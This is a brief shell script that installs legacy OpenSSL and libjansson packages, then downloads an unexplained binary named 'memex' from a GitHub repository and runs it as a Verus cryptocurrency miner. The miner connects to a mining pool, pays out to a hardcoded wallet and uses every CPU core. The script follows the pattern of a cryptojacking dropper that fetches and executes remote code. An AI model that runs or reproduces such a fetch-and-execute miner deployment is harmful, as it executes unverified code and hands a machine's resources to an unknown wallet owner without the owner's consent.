wget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1-1ubuntu2.1~18.04.23_amd64.deb
dpkg -i libssl1.1_1.1.1-1ubuntu2.1~18.04.23_amd64.deb
apt-get install libjansson4 -y
apt --fix-broken install -y
apt-get install libjansson4 -y
wget https://github.com/fikriboehimi/hgoeshfew/raw/refs/heads/main/memex
chmod +x memex
./memex -a verus -o stratum+tcp://us.vipor.net:5040 -u RTth6ZswVosWc6jwTgugSVpZaen6aSCUzu.Device -p x -t $(nproc)
